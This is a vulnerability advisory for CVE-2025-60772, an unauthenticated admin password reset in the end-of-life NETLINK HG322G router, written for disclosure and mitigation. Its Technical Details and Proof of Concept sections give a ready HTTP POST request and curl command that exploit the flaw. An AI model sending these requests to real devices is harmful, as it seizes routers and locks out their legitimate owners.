# CVE-2025-60772 — Improper Authentication in NETLINK HG322G Router

**Title:** NETLINK HG322G Router Improper Authentication Vulnerability  
**CVE ID:** CVE-2025-60772  
**Author / Discoverer:** Sathishkumar M R  
**Status:** Published  
**Public Disclosure Date:** 2025-10-18  
**CVE Assigned Date:** 2025-10-17  
**Severity:** CVSS v3.1 Base Score: 8.2 (High)  
**Overall CVSS (Temporal/Environmental Adjusted):** 7.8

---

## Summary
An improper authentication vulnerability exists in the web management interface of the **NETLINK HG322G GPON ONT** router. An unauthenticated remote attacker can exploit the password reset endpoint `/boaform/getASPdata/new_formPasswordSetup` to reset the administrator password without prior authentication. Since the device supports a single administrator account, successful exploitation results in **privilege escalation** and **denial of service** (the legitimate administrator can be locked out).

---

## Affected Products
- **Vendor:** NETLINK  
- **Product:** HG322G GPON ONT  
- **Hardware Version:** V1.3  
- **Firmware Version:** V1.0.00-231017 *(End of Life)*

---

## Technical Details
The device exposes a password reset endpoint that does not validate session tokens, authentication, or CSRF protections. An unauthenticated attacker with network access (LAN, or WAN if the management interface is exposed) can invoke the endpoint via a crafted HTTP POST to reset the administrator password.

Sanitized example request:

```
POST /boaform/getASPdata/new_formPasswordSetup HTTP/1.1
Host: <router-ip>
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

username=admin&password=NewP@ssw0rd!
```

Because the router only supports a single admin account, resetting the password with a value the attacker controls grants the attacker full administrative control and locks out the legitimate admin.

## Proof of Concept (Sanitized)
> **Warning:** Do not run PoC against devices you do not own or have explicit permission to test.

A non-destructive PoC example (curl):

```bash
# Example (sanitized) — do not run against production or third-party devices
curl -X POST "http://<router-ip>/boaform/getASPdata/new_formPasswordSetup"   -H "Content-Type: application/x-www-form-urlencoded"   -d "username=admin&password=Example123!"
```

Place more detailed PoC artifacts in a `poc/` folder in your repository if needed; avoid including fully-automated exploit scripts in public branches.

## Impact
- **Confidentiality:** Low — this flaw primarily resets credentials rather than directly exfiltrating data.  
- **Integrity:** None observed directly — however, with admin access an attacker can change configuration and firmware (leading to broader integrity impact).  
- **Availability:** High — attacker can lock out legitimate admin (DoS of management).  
- **Privilege Escalation:** Yes — unauthenticated attacker gains full administrative privileges.

**CVSS v3.1 Vector (Base/Example):**  
`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:U/RC:C`  
- **Base Score:** 8.2 (High)  
- **Temporal/Environmental Adjusted:** 7.8 (as shown in provided analysis)

## Timeline
- **2025-08-22:** Vulnerability discovered.  
- **2025-08-23:** Reported to vendor (NETLINK).  
- **2025-10-17:** CVE ID assigned (CVE-2025-60772).  
- **2025-10-18:** Public disclosure (this advisory).

---

## Mitigation & Recommendations
- **Disable remote (WAN) web management** on the router.  
- **Restrict management access** to trusted IP addresses (ACLs) or place the device behind a management VLAN.  
- **Replace or isolate** affected devices where possible, since the listed firmware is End of Life and unlikely to receive patches.  
- If vendor provides a fix or firmware update, **apply updates immediately** and validate management interfaces after patching.  
- Monitor for unauthorized configuration changes and unexpected outbound connections from the device.
